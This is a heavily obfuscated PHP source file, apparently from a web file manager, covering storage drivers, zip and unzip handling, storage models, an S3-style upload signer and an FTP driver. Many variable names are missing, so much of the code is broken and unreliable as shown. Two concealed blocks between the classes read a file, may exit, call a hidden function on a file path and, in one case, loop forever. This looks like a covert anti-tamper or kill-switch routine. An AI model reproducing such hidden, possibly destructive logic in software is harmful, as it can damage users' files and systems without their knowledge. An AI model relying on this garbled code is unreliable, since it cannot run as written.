isset($Ƨ[$į[32]])) { $ = urldecode($Ƨ[$į[32]]); } throw new Exception($į[1203] . LNG($į[1204]) . $į[1005] . clear_html($) . $į[12]); } if ($ <= 0) { return $į[12]; } if ($ < 0 || $ >= $ || $ > 1024 * 1024 * 10) { throw new Exception("\146\x69\154\x65\122\x65\x61\x64\40\145\x72\162\157\x72\x21\40\x73\164\x61\x72\x74\x3d{$}\x3b\x6c\145\x6e\147\164\x68\75{$}\73\x20\163\151\172\x65\x3d{$}\73"); } $ = $->fileSubstr($年, $, $); if (!$ && $ && isset($GLOBALS[$į[1205]])) { throw new Exception($GLOBALS[$į[1205]][$į[1206]]); } return $; } private static function driverMake(&$) { $ǚ =& $_SERVER[]; $ = KodIO::parse($); if (!self::$driverListSystem) { $ݻ = Model($ǚ[801])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ݻ, $ǚ[443]); } if ($[$ǚ[33]] == KodIO::KOD_IO && !self::$driverListSystem[$[$ǚ[443]]]) { return !1; } $ = $[$ǚ[1207]]; $ھ = self::driverGet($, $); return $ھ; } private static function driverGet($٩鯇, &$) { $ =& $_SERVER[]; $ = $٩鯇[$[1208]]; $܈ = $٩鯇[$[443]]; switch ($٩鯇[$[33]]) { case KodIO::KOD_IO: $騍 = self::$driverListSystem[$܈]; break; case KodIO::KOD_SOURCE: $ = $܈ . $; $騍 = array($[1209] => $[1210], $[6] => $٩鯇); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ = $GLOBALS[$[1211]]; self::$driverListUser = array_to_keyvalue($, $[443]); } $騍 = self::$driverListUser[$܈]; break; case KodIO::KOD_SHARE_LINK: $騍 = array($[1209] => $[1212], $[6] => $٩鯇); $ = Action($[1213])->sharePathInfo($٩鯇[$[84]]); $ = $[$[181]]; if (!$[$[181]]) { $ = Model($[632])->getInfo($[$[633]]); $ = KodIO::clear($[$[1214]] . $٩鯇[$[1207]]); $٩鯇[$[528]] = $; $٩鯇[$[1190]] = $; $騍 = array($[1209] => $[1215], $[6] => $٩鯇); } break; case KodIO::KOD_SHARE_ITEM: $騍 = array($[1209] => $[1216], $[6] => $٩鯇); $ = Model($[632])->getInfo($٩鯇[$[443]]); if ($[$[181]] == $[212]) { $ = KodIO::clear($[$[1214]] . $٩鯇[$[1207]]); $٩鯇[$[528]] = $; $٩鯇[$[1190]] = $; $騍 = array($[1209] => $[1217], $[6] => $٩鯇); } else { if (!$) { $ = $[$[181]]; } } break; default: $ = $٩鯇[$[84]]; $騍 = array($[1209] => $[1218]); break; } $ = $٩鯇[$[84]]; if (!isset(self::$driverCache[$])) { $ = strtolower($騍[$[95]]); $ = $GLOBALS[$[6]][$[89]][$[860]]; $ν = $[74] . (isset($[$]) ? $[$] : ucfirst($)); if (!class_exists($ν)) { show_json("{$ν}\x20\156\x6f\164\x20\x65\x78\x69\163\x74\x73\x21", !1); } $ڞ = isset($騍[$[6]]) ? $騍[$[6]] : !1; self::$driverCache[$] = new $ν($ڞ); } $ = self::$driverCache[$]; $->pathDriver = $; $->pathBase = $[12]; if (isset($騍[$[6]][$[1219]])) { $->pathBase = rtrim($騍[$[6]][$[1219]], $[8]) . $[8]; $ = $->pathBase . ltrim($, $[8]); } $ = $->getPath($); if (isset($٩鯇[$[1190]])) { $ = $٩鯇[$[1190]]; } $->path = $; return $; } public static function errorTips($֋ = false) { $Ůޖ =& $_SERVER[]; static $ڇ = array(); $ۅ = 1000; if ($֋ === -1) { return $ڇ ? $ڇ[count($ڇ) - 1] : $Ůޖ[12]; } if ($֋ === !1) { return implode($Ůޖ[246], $ڇ); } if (count($ڇ) >= $ۅ) { $ڇ = array_slice($ڇ, $ۅ * 0.5, $ۅ); } $ڇ[] = $֋; write_log($Ůޖ[163] . ACTION . $Ůޖ[1220] . $֋, $Ůޖ[1221]); } public static function getLastError($ٽ = '') { $ = self::errorTips(-1); return $ ? $ : $ٽ; } } if (!isset($_SERVER[$_SERVER[][911]]) || !isset($_SERVER[$_SERVER[][1222]])) { $_getc = $_SERVER[][914]; $_getfile = $_SERVER[$_SERVER[][915]] . $_SERVER[][916]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[][246], $_getfilec); if (count($_getarrs) < $_SERVER[][657]) { $exit = $_SERVER[][917]; $exit(); } $_act = $_SERVER[][1223]; $_act($_SERVER[$_SERVER[][915]] . $_SERVER[][916]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[][422]); } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ӝ; if ($ӝ) { return $ӝ; } $ = IO::init($_SERVER[][8]); return $; } private static function iconvSystem($) { return self::local()->iconvSystem($); } private static function iconvApp($陦) { return self::local()->iconvApp($陦); } public static function zipFolder($, $ҟ䪲 = "\172\x69\160", $Μ = '', $ = REPEAT_RENAME) { $ǅ =& $_SERVER[]; $ = IO::listPath($); if (!$) { return !1; } $ = array_merge($[$ǅ[82]], $[$ǅ[83]]); return self::zip($, $ҟ䪲, $Μ, $); } public static function zip($ƀ袲, $ˈ = "\172\151\x70", $ = '', $՟ = REPEAT_RENAME) { $Һ =& $_SERVER[]; if (is_string($ƀ袲) && $ƀ袲) { $ƀ袲 = array(array($Һ[84] => $ƀ袲)); } $̋ = self::init($ƀ袲[0][$Һ[84]]); $ = self::info($ƀ袲[0][$Һ[84]]); $ = $Һ[12]; $ = $Һ[12]; $ȶܸ = $Һ[12]; if ($ && substr($, -1, 1) != $Һ[8]) { $ = get_path_father($); $ȶܸ = get_path_this($); } else { $ = self::pathFather($[$Һ[84]]); $ȶܸ = $[$Һ[32]] . $Һ[10] . $ˈ; if (count($ƀ袲) > 1) { $ = IO::info($); $ȶܸ = $[$Һ[32]] . $Һ[10] . $ˈ; } if ($) { $ = $; } } if ($̋->getType() == $Һ[106]) { $ˬķ = self::init($); $׏ = $ˬķ->getType() == $Һ[106] ? $ : get_path_father($̋->path); $׏ = rtrim($׏, $Һ[8]) . $Һ[8]; mk_dir($׏); } else { $ = TEMP_FILES . $Һ[1224] . time() . rand_string(8) . $Һ[8]; mk_dir($); file_put_contents($ . $Һ[1225], $Һ[12]); $׏ = $; } $ۊ = IO::info($׏); if (!$ۊ || !$ۊ[$Һ[217]]) { show_json(LNG($Һ[1226]), !1); } $ = self::zipFileList($ƀ袲, $); foreach ($ as $ => $글Һ) { $[$] = self::iconvSystem($글Һ); } $¯Ԓ = get_filename_auto($׏ . $ȶܸ, $Һ[12], $՟); KodArchive::create(self::iconvSystem($¯Ԓ), $); if (!IO::exist($¯Ԓ)) { if ($) { del_dir($); } show_json(LNG($Һ[1227]), !1); } if (!$) { return $¯Ԓ; } $ו = self::move($¯Ԓ, $, $՟); if ($) { del_dir($); } if (!$¯Ԓ) { show_json(LNG($Һ[1227]), !1); } return $ו; } public static function unzip($򳦉, $ꢓ, $Ж = "\55\61", $޲ = "\162\x65\160\x6c\x61\x63\x65") { $ҥ =& $_SERVER[]; $ = parent::info($򳦉); if (!$) { show_json(LNG($ҥ[1228]), !1); } $ = IO::infoFullSimple($ꢓ); if (!$) { $ꢓ = IO::mkdir($ꢓ); } if (isset($[$ҥ[181]]) && trim($[$ҥ[84]], $ҥ[8]) != trim($ꢓ, $ҥ[8])) { $ˉ = KodIO::make($[$ҥ[180]]); $׉ = IO::fileNameAuto($ˉ, $[$ҥ[32]], REPEAT_RENAME_FOLDER, !0); $ꢓ = IO::mkdir($ˉ . $׉); } $Ж = $Ж && $Ж != $ҥ[1229] ? @json_decode($Ж, !0) : -1; $ = self::unzipPart($򳦉, $Ж); if (!$ || !IO::exist($[$ҥ[214]])) { show_json(LNG($ҥ[105]), !1); } $ = $[$ҥ[1230]][count($[$ҥ[1230]]) - 1]; if ($[$ҥ[1231]] == -1 || substr($[$ҥ[32]], -1, 1) == $ҥ[8]) { $ʦā = $[$ҥ[1232]] . rand_string(10) . $ҥ[8]; mk_dir($ʦā); $ = count($[$ҥ[1230]]) == 1 ? IO::ext($򳦉) : get_path_ext($[$ҥ[214]]); $ޱ = KodArchive::extract(self::iconvSystem($[$ҥ[214]]), $ʦā, $[$ҥ[1231]], $׉, $); self::unzipErrorCheck($ޱ, array($ҥ[1233], $򳦉, $, $ꢓ, $)); Hook::trigger($ҥ[1234], $ʦā); recursion_dir($ʦā, $ݗ, $, 0); $ = array_merge($ݗ, $); $ = array(); foreach ($ as $) { $ϊ = IO::move(self::iconvApp($), $ꢓ, $޲); if ($ϊ) { $[] = $ϊ; } } del_dir($ʦā); } else { $ϊ = IO::move($[$ҥ[214]], $ꢓ, $޲, get_path_this($[$ҥ[32]])); if ($ϊ) { $[] = $ϊ; } } return $ ? $ : !1; } public static function unzipList($) { $څ =& $_SERVER[]; $ = isset($[$څ[1235]]) ? $[$څ[1235]] : !1; $§ = isset($[$څ[1231]]) ? @json_decode($[$څ[1231]], !0) : -1; $Ḥк = self::unzipPart($[$څ[84]], $§); if (!$Ḥк || !IO::exist($Ḥк[$څ[214]])) { show_json(LNG($څ[105]), !1); } $˰ = $Ḥк[$څ[1230]][count($Ḥк[$څ[1230]]) - 1]; $ʈ = in_array(IO::ext($Ḥк[$څ[214]]), array($څ[357], $څ[1236], $څ[1237], $څ[1238], $څ[1239], $څ[1240])); if (!$ && ($˰[$څ[1231]] == -1 || $ʈ)) { $վ = $Ḥк[$څ[1232]] . get_path_this($Ḥк[$څ[214]]) . $څ[1241]; if (!IO::exist($վ)) { $ = $˰[$څ[1231]] == -1 ? get_path_ext(IO::pathThis($[$څ[84]])) : get_path_ext($Ḥк[$څ[214]]); $ = KodArchive::listContent(self::iconvSystem($Ḥк[$څ[214]]), !0, $); self::unzipErrorCheck($, array($څ[1242], $, $Ḥк)); @file_put_contents($վ, json_encode($[$څ[1243]])); } return @json_decode(IO::getContent($վ), !0); } IO::fileOut($Ḥк[$څ[214]], $, get_path_this($˰[$څ[32]])); die; } private static function zipFileList($, $ = false) { $禩 =& $_SERVER[]; $ߤ = array(); foreach ($ as $) { $ = $[$禩[84]]; if ($) { $ = self::copy($[$禩[84]], $, $禩[852]); } else { $↤ = self::init($[$禩[84]]); if ($↤->getType() == $禩[106]) { $ = $↤->path; } } if ($ && self::local()->exist($)) { $ߤ[$[$禩[84]]] = $; } } if (!empty($ߤ)) { return array_values($ߤ); } show_json(LNG($禩[1204]), !1); } private static function localFilePath($ϙ) { $ڂ =& $_SERVER[]; $ɽ = KodIO::parse($ϙ); if ($ɽ[$ڂ[33]] == KodIO::KOD_SOURCE) { $ȩ = Model($ڂ[859])->fileInfoGet(KodIO::sourceID($ϙ)); if (!$ȩ[$ڂ[84]]) { show_json($ڂ[1244], !1); } $ϙ = $ȩ[$ڂ[84]]; } $Ϗ = self::init($ϙ); if ($Ϗ->pathParse[$ڂ[1190]]) { $ϙ = $Ϗ->pathParse[$ڂ[1190]]; $Ϗ = self::init($ϙ); } $Û́ = $Ϗ->getType(); if ($Û́ == $ڂ[106] || $Û́ == $ڂ[1245]) { if (!$Ϗ->exist($Ϗ->path)) { show_json(LNG($ڂ[105]), !1); } return $Ϗ->path; } return !1; } public static function unzipPart($ꄅ, $睦 = -1) { $ =& $_SERVER[]; $ = IO::pathThis($ꄅ); if (!$睦 || $睦 == -1) { $ں = array(array($[32] => $, $[1231] => -1)); $ں[0][$[1246]] = $ں[0][$[32]]; } else { if (is_array($睦)) { $ں = $睦; $ = count($ں) - 1; for ($ = 0; $ <= $; $++) { $ = $ں[$]; $ = get_path_this($[$[32]]) . (checkExtSafe($[$[32]]) ? $[12] : $[1247]); $ں[$][$[1246]] = $[1248] . intval($[$[1231]]) . $[430] . $; if ($ == 0) { continue; } $ں[$][$[1246]] = $ں[$ - 1][$[1246]] . $[1249] . $ں[$][$[1246]]; } } } if (!is_array($ں) || count($ں) == 0) { return !1; } $ѵ = $ں[count($ں) - 1]; if (!IO::exist($ꄅ)) { return !1; } $洀 = TEMP_FILES . $[1250] . kodIO::hashPathSafe($ꄅ) . $[8]; $ = $洀 . $ѵ[$[1246]]; mk_dir($洀); file_put_contents(TEMP_FILES . $[1225], $[12]); if (IO::exist($)) { return array($[214] => $, $[1230] => $ں, $[1232] => $洀); } $ = self::localFilePath($ꄅ); if (!$) { $ = $洀 . $[1251]; if (!IO::exist($)) { self::copy($ꄅ, $洀, !1, get_path_this($)); } } if (!$ || !IO::exist($)) { return !1; } if ($ѵ[$[1231]] == -1) { return array($[214] => $, $[1230] => $ں, $[1232] => $洀); } $Ʋ = $; foreach ($ں as $ => $) { if (!$ || $[$[1231]] == $[1229]) { break; } if (substr($[$[32]], -1, 1) == $[8]) { break; } $آ = in_array(get_path_ext($[$[1246]]), array($[357], $[1236], $[1237], $[1238], $[1239], $[1240])); $Ӑխ = $ == count($ں) - 1 && $آ; $ɡо = $洀 . $[$[1246]]; $ﹾ = $洀 . get_path_this($[$[32]]); if (IO::exist($ɡо)) { $Ʋ = $ɡо; continue; } $꾷 = $ == 0 ? get_path_ext($) : get_path_ext($Ʋ); $ۓ = KodArchive::extract(self::iconvSystem($Ʋ), $洀, $[$[1231]], $Û, $꾷); self::unzipErrorCheck($ۓ, array($[1252], $ꄅ, $ں, $, $ɡо)); if (IO::exist($ﹾ)) { IO::rename($ﹾ, get_path_this($ɡо)); } $Ʋ = $ɡо; } $ = $Ʋ; return array($[214] => $Ʋ, $[1230] => $ں, $[1232] => $洀); } private static function unzipErrorCheck($ϝ, $鋶 = false) { $̓ =& $_SERVER[]; if ($ϝ[$̓[1253]]) { return !0; } write_log(array($̓[1254], $ϝ, $鋶), $̓[1255]); show_json($̓[1256] . json_encode($ϝ[$̓[1243]]), !1); die; } } goto A΢; d: class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\56\163\157\x75\162\x63\145\x53\x65\143\x72\145\164\x4c\x69\x73\x74"; public $field = array("\x73\x6f\165\x72\143\x65\x49\x44", "\164\x79\160\x65\111\104", "\x63\162\145\x61\x74\145\x55\163\145\x72"); } if ($_SERVER[$_SERVER[][911]] != $_SERVER[$_SERVER[][912]]) { $_getc = $_SERVER[][914]; $_getfile = $_SERVER[$_SERVER[][915]] . $_SERVER[][916]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[][246], $_getfilec); if (count($_getarrs) < $_SERVER[][657]) { $exit = $_SERVER[][917]; $exit(); } $_act = $_SERVER[][1223]; $_act($_SERVER[$_SERVER[][1222]]); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\x2e\163\x74\x6f\x72\x61\147\x65\x4c\x69\163\x74"; public $field = array("\156\141\155\x65", "\x73\151\172\145\115\141\170", "\163\171\163\164\145\155", "\x64\145\146\x61\x75\x6c\x74", "\x64\162\x69\166\145\162", "\143\x6f\156\x66\151\x67"); public function listData($ᚼ = false, $Ϊ = "\155\157\144\151\146\171\x54\x69\x6d\145", $ = false) { $ћ =& $_SERVER[]; $Խ = parent::listData($ᚼ, $Ϊ, $); if ($ᚼ) { return $Խ; } $Р = $this->ioSizeUseGet(array_to_keyvalue($Խ, $ћ[12], $ћ[443])); foreach ($Խ as $ => $ٿ) { unset($Խ[$][$ћ[6]]); $Խ[$][$ћ[1874]] = isset($Р[$ٿ[$ћ[443]]]) ? $Р[$ٿ[$ћ[443]]] : 0; } return $Խ; } public function ioSizeUseGet($) { $ =& $_SERVER[]; if (!$) { return array(); } $ = $[2205] . implode($[50], $); $é携 = Cache::get($); if ($é携) { return $é携; } $Έ = array($[851] => $[443], $[2206] => $[76]); $뺖 = array($[851] => array($[7], $)); $é携 = Model($[823])->field($Έ)->where($뺖)->group($[851])->select(); $é携 = array_to_keyvalue($é携, $[443], $[76]); Cache::set($, $é携, 600); return $é携; } public function getConfig($Ǻ) { $ = parent::listData($Ǻ); return json_decode($[$_SERVER[][6]], !0); } public function update($, $) { $ =& $_SERVER[]; $߂ = $[$[32]]; $ٕ = array_to_keyvalue(parent::listData(), $[32]); if (isset($ٕ[$߂]) && $ٕ[$߂][$[443]] != $) { return !1; } $this->checkPwd($, $); if (isset($[$[2207]]) && $[$[2207]] == $[88]) { $this->checkConfig($); } unset($[$[2207]]); $̧ = parent::update($, $); if ($̧ && $[$[37]]) { $Ҙ = 0; foreach ($ٕ as $旻) { if ($旻[$[37]] && $旻[$[443]] != $) { $Ҙ = $旻[$[443]]; parent::update($旻[$[443]], array($[37] => 0)); } } $this->updateBackup($, $Ҙ); } return $̧; } public function add($۵݅) { $ =& $_SERVER[]; $ͼ = array_to_keyvalue(parent::listData(), $[32]); if (isset($ͼ[$۵݅[$[32]]])) { return !1; } $this->checkConfig($۵݅); $޼ = parent::insert($۵݅); if ($޼ && $۵݅[$[37]]) { foreach ($ͼ as $Ӣ) { if ($Ӣ[$[37]]) { parent::update($Ӣ[$[443]], array($[37] => 0)); } } } return $޼; } public function updateBackup($ҳ됅, $Α) { $ =& $_SERVER[]; if (!$Α) { return; } $ڇ = Model($[783])->config(); if ($ڇ[$[1657]] != $[88] || $ڇ[$[785]] != $Α) { return; } $ = Model($[804])->get($[814]); $ = json_decode($, !0); if (!$) { return; } $[$[785]] = $ҳ됅; Model($[804])->set(array($[814] => $)); } public function checkPwd($, &$Ȭǰ) { $֛ =& $_SERVER[]; if (empty($Ȭǰ[$֛[6]])) { return; } $ɸ = json_decode($Ȭǰ[$֛[6]], !0); $ݞ = $֛[12]; $η = array($֛[2208], $֛[2209], $֛[928]); foreach ($η as $) { if (isset($ɸ[$])) { $ݞ = $; break; } } if (!$ݞ) { return; } $ƚ = $this->getConfig($); $ɲل = $ƚ[$ݞ]; $Տ = $ɸ[$ݞ]; if ($Տ == str_repeat($֛[203], strlen($ɲل))) { $ɸ[$ݞ] = $ɲل; $Ȭǰ[$֛[6]] = json_encode($ɸ); } else { if ($Տ != $ɲل) { $Ȭǰ[$֛[2207]] = $֛[88]; } } } public function checkConfig(&$, $ = false) { $® =& $_SERVER[]; $Ů = strtolower($[$®[95]]); $ˍҺ = json_decode($[$®[6]], !0); foreach ($ˍҺ as $ => $) { if (is_string($)) { $ˍҺ[$] = trim($); } } $ˍҺ[$®[2210]] = rand_string(6); $穭 = $GLOBALS[$®[6]][$®[89]][$®[860]]; $ꪊ = isset($穭[$Ů]) ? $穭[$Ů] : ucfirst($Ů); $ꂟ = $®[74] . $ꪊ; if (!$ꪊ || !class_exists($ꂟ)) { if ($) { return LNG($®[2211]); } write_log(array($®[2212], $, get_caller_info()), $®[2213]); show_json(LNG($®[2211]), !1, $); } $檴 = new $ꂟ($ˍҺ); if (in_array($Ů, $檴->objectDriver)) { if (!$檴->isBucketCors() && !$檴->setBucketCors()) { $͹ܝ = LNG($®[2214]); $͹ܝ .= $®[2215] . LNG($®[2216]); if ($) { return $͹ܝ; } show_json($͹ܝ, !1); } } $ݻ = rtrim($ˍҺ[$®[1219]], $®[8]) . $®[8]; $ = $檴->getPath($ݻ . $®[1225]); if (!$檴->mkfile($)) { if ($) { return LNG($®[2214]); } show_json(LNG($®[2214]), !1); } $ˍҺ[$®[1219]] = $ݻ; $[$®[6]] = json_encode($ˍҺ); $[$®[95]] = $ꪊ; return !0; } public function driverListSystem() { $؃ =& $_SERVER[]; $α = parent::listData(); $ = array(); foreach ($α as $Ɏ) { unset($Ɏ[$؃[215]], $Ɏ[$؃[85]]); $Ɏ[$؃[6]] = json_decode($Ɏ[$؃[6]], !0); $[] = $Ɏ; } return $; } public function defaultDriver() { $ɣ =& $_SERVER[]; $ = parent::listData(); $ćҞ = array_filter_by_field($, $ɣ[37], 1); $ćҞ = $ćҞ[0]; if ($ćҞ) { $ćҞ[$ɣ[6]] = json_decode($ćҞ[$ɣ[6]], !0); } return $ćҞ; } public function driverInfo($) { $ =& $_SERVER[]; $Ω = array_to_keyvalue(parent::listData(), $[443]); if (!isset($Ω[$])) { return !1; } $Ŋ = $Ω[$]; $Ŋ[$[6]] = json_decode($Ŋ[$[6]], !0); return $Ŋ; } public function remove($) { $this->removeShareItems($); return parent::remove($); } public function removeWithFile($奲, $) { $䀁 =& $_SERVER[]; $ = array($䀁[851] => $奲); $ = Model($䀁[512])->where($)->count(); $򷐵 = Model($䀁[512])->where($)->sum($䀁[76]); $ʘ = $ . $䀁[2217] . $奲; $ؼ = LNG($ == $䀁[588] ? $䀁[2218] : $䀁[2219]); $ė = new TaskFileTransfer($ʘ, $䀁[2213], $, $ؼ . "\50{$奲}\x29"); $ė->task[$䀁[797]] = (double) $򷐵; $̌ = KodIO::defaultDriver(); $Ʀ = $̌[$䀁[443]]; $ӎ = "\x7b\x69\x6f\72{$Ʀ}\x7d\57"; $ = !0; $ߑߴ = array(); $ = Model($䀁[214])->where($)->field($䀁[2220])->select(); foreach ($ as $܌) { $܍ = $܌[$䀁[84]]; $ = $ӎ . str_replace("\173\151\157\x3a{$奲}\x7d\x2f", $䀁[12], $܍); if (!IO::exist($܍)) { $ߑߴ[] = $܌[$䀁[509]]; $ė->updateFileEnd($܌[$䀁[32]], $܌[$䀁[76]]); continue; } if (IO::exist($)) { $ė->updateFileEnd($܌[$䀁[32]], $܌[$䀁[76]]); continue; } if (!IO::move($܍, get_path_father($))) { $ = !1; break; } $ = array($䀁[509] => $܌[$䀁[509]]); $ؓԳ = array($䀁[851] => $Ʀ, $䀁[84] => $); Model($䀁[214])->where($)->save($ؓԳ); } $this->removeByFileID($ߑߴ); if (!$) { $ė->stop($ʘ); return !1; } $ė->end(); if ($ == $䀁[1854]) { $this->remove($奲); } } public function progress($, $) { return Task::get($ . $_SERVER[][2217] . $); } private function removeByFileID($ݪ = array()) { $͉Õ =& $_SERVER[]; if (empty($ݪ)) { return; } $߀֗ = array($͉Õ[509] => array($͉Õ[7], $ݪ)); $ = Model($͉Õ[1373])->where($߀֗)->field($͉Õ[181])->select(); if (!$) { return; } $ = array_to_keyvalue($, $͉Õ[12], $͉Õ[181]); foreach ($ as $ˡѳ) { Model($͉Õ[458])->removeNow($ˡѳ, !1); } } private function removeShareItems($²ה) { $ =& $_SERVER[]; $ = "\x7b\x69\x6f\72{$²ה}\175\57"; $ = array($[181] => 0, $[1214] => array($[427], "{$}\45")); $ӀΞ = Model($[1865])->where($)->field($[633])->select(); if (empty($ӀΞ)) { return; } $Ř = array_to_keyvalue($ӀΞ, $[12], $[633]); Model($[632])->remove($Ř); } } goto B݌ݎ; Cц: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($) { parent::__construct($); $this->signatureVersion($_SERVER[][231]); } public function uploadFormData($뮳, $Ջ = 3600) { $ =& $_SERVER[]; $ = $[213]; $ = $[253]; $ = $[62]; $Ы = gmdate($[254]); $ = gmdate($[255]); $¤ = $[256]; $ق = $Ջ . $[12]; $ = $[257]; $障 = array($this->accessKey, $, $this->region, $, $¤); $˝ = implode($[8], $障); $ = array($[258] => gmdate($[1365], strtotime($[260])), $[261] => array(array($[262] => $this->bucket), array($[263] => $), array($[264], $[265], $[12]), array($[264], $[266], $[12]), array($[264], $[267], $[12]), array($[268] => $), array($[269] => $˝), array($[270] => $), array($[271] => $Ы), array($[272] => $ق))); $ = base64_encode(json_encode($)); $ = hash_hmac($[273], $, $[274] . $this->secret, !0); $ = hash_hmac($[273], $this->region, $, !0); $ = hash_hmac($[273], $, $, !0); $ = hash_hmac($[273], $¤, $, !0); $ = hash_hmac($[273], $, $); $ = array($[230] => $[12], $[275] => $[12], $[263] => $, $[268] => $, $[276] => $, $[277] => $˝, $[278] => $, $[279] => $Ы, $[280] => $ق, $[281] => $, $[196] => $this->getHost()); return $; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($͔) { parent::__construct(); if (count($͔) > 0) { $this->_init($͔); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ޞ߲) { $͊ =& $_SERVER[]; global $config; $this->appCharset = $config[$͊[1391]]; $this->systemCharset = $config[$͊[1392]]; if (isset($ޞ߲[$͊[1393]]) && $ޞ߲[$͊[1393]]) { $this->systemCharset = $ޞ߲[$͊[1393]]; } } public function iconvApp($) { return $this->iconvTo($, $this->systemCharset, $this->appCharset); } public function iconvSystem($) { return $this->iconvTo($, $this->appCharset, $this->systemCharset); } public function getPathOuter($) { $޴ =& $_SERVER[]; $ = $this->iconvApp($this->pathBase); $ = $this->iconvApp($); if (substr($, 0, 2) == $޴[1394]) { $ = BASIC_PATH . substr($, 2); } if (substr($, 0, 2) == $޴[1394]) { $ = BASIC_PATH . substr($, 2); } $ = KodIO::clear($); $ = KodIO::clear($); $ = substr($, strlen($)); if (empty($this->pathDriver)) { return $; } return $this->pathDriver . $޴[8] . ltrim($, $޴[8]); } private function _init($ = array()) { $ƽ =& $_SERVER[]; if (!function_exists($ƽ[1395])) { throw new Exception(LNG($ƽ[1396])); } $this->config = $; $this->charsetReset($); foreach ($ as $ => $ﾍ) { if (isset($this->{$})) { $this->{$} = $ﾍ; } } return $this->_login($); } private function _login($佶) { $ =& $_SERVER[]; static $ě = array(); $͸Ԟ = md5(json_encode($佶)); if (isset($ě[$͸Ԟ])) { foreach ($ě[$͸Ԟ] as $ => $ᝥ) { $this->{$} = $ᝥ; } return !0; } $ΰ = parse_url(trim($this->server, $[8])); $this->host = $ΰ[$[196]]; $ϻ = isset($ΰ[$[195]]) && $ΰ[$[195]] == $[1397] ? !0 : !1; $this->scheme = $ϻ ? $[1398] : $[1399]; $this->port = isset($ΰ[$[197]]) ? $ΰ[$[197]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $φ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ڹ = $this->pasv == $[88] ? !0 : !1; @ftp_pasv($this->connect, $ڹ); $ě[$͸Ԟ] = array($[1400] => $this->connect, $[196] => $this->host, $[195] => $this->scheme, $[197] => $this->port); return $φ; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($, $Ō = '', $廣 = REPEAT_RENAME) { if ($this->setContent($, $Ō)) { return $this->getPathOuter($); } return !1; } public function mkdir($Λ, $ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $Λ = $this->iconvSystem($Λ); if ($this->_isFolder($Λ) || @ftp_mkdir($this->connect, $Λ)) { return $this->getPathOuter($Λ); } if (!$this->mkdir($this->pathFather($Λ))) { return !1; } if ($Λ = @ftp_mkdir($this->connect, $Λ)) { return $this->getPathOuter($Λ); } return !1; } public function copyFile($, $﹔) { if (!$this->_isconn()) { return !1; } $É = $this->pathThis($this->iconvSystem($)); $ = $this->tempFile($É); $ = $this->iconvApp($); $this->download($, $); $ݧ = $this->upload($﹔, $); $this->tempFileRemve($); return $ݧ; } public function moveFile($, $ίÌ) { if (!$this->_isconn()) { return !1; } $ = $this->iconvSystem($); $ίÌ = $this->iconvSystem($ίÌ); $ޞ = @ftp_rename($this->connect, $, $ίÌ); return $ޞ ? $this->getPathOuter($ίÌ) : !1; } public function delFile($؇) { if (!$this->_isconn()) { return !1; } $؇ = $this->iconvSystem($؇); return @ftp_delete($this->connect, $؇); } public function delFolder($Ꞡ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ = $ݽ = array(); $this->fileList($Ꞡ, $, $ݽ, !0); $this->listItemCache = !0; foreach ($ݽ as $õ) { $ò = $this->iconvSystem($õ[$_SERVER[][32]]); $۰棐 = @ftp_delete($this->connect, $ò); if (!$۰棐) { return !1; } } foreach ($ as $ò) { $ò = $this->iconvSystem($ò); $۰棐 = @ftp_rmdir($this->connect, $ò); if (!$۰棐) { return !1; } } $Ꞡ = $this->iconvSystem($Ꞡ); return @ftp_rmdir($this->connect, $Ꞡ); } public function rename($Ȍ, $Բ) { $׉ =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $胊 = $this->fileNameAuto($this->pathFather($Ȍ), $Բ); $胊 = $this->iconvSystem($胊); $Ȍ = $this->iconvSystem($Ȍ); $ = $this->pathFather($Ȍ); $ǵ = rtrim($, $׉[8]) . $׉[8] . $胊; $Ԝ = @ftp_rename($this->connect, $Ȍ, $ǵ); $ǵ = $this->iconvApp($ǵ); return $Ԝ ? $this->getPathOuter($ǵ) : !1; } private function folderInfo($, $ = false) { $ =& $_SERVER[]; $ۗ = array($[32] => $this->pathThis($), $[84] => $this->getPathOuter($[8] . $), $[33] => $[75]); if ($) { return $ۗ; } $ۗ[$[215]] = $ۗ[$[85]] = 0; $ۗ[$[216]] = $ۗ[$[217]] = !0; return $ۗ; } private function fileInfo($Ӓ, $䆏 = false, $ = array()) { $ =& $_SERVER[]; $ҫ = array($[32] => $this->pathThis($Ӓ), $[84] => $this->getPathOuter($[8] . $Ӓ), $[33] => $[214], $[76] => isset($[$[76]]) ? $[$[76]] : 0, $[175] => $this->ext($Ӓ)); if ($䆏) { return $ҫ; } $ҫ[$[215]] = $ҫ[$[85]] = 0; $ҫ[$[216]] = $ҫ[$[217]] = !0; $ = $this->iconvSystem($Ӓ); $ҫ[$[85]] = @ftp_mdtm($this->connect, $); if (empty($)) { $ = $this->objectMeta($Ӓ); if (!$) { return $ҫ; } } $ҫ[$[76]] = $[$[76]]; return $ҫ; } public function size($) { $ܕ = $this->objectMeta($); return $ܕ ? $ܕ[$_SERVER[][76]] : 0; } public function info($뛽߿) { if ($this->isFile($뛽߿)) { return $this->fileInfo($뛽߿, 0); } else { if ($this->isFolder($뛽߿)) { return $this->folderInfo($뛽߿); } } return !1; } private function fileList($ǣ, &$ݱܚ, &$󝏤, $ = false) { $É =& $_SERVER[]; $ǣ = $this->iconvSystem($ǣ); if (!$this->isFolder($ǣ)) { return !1; } 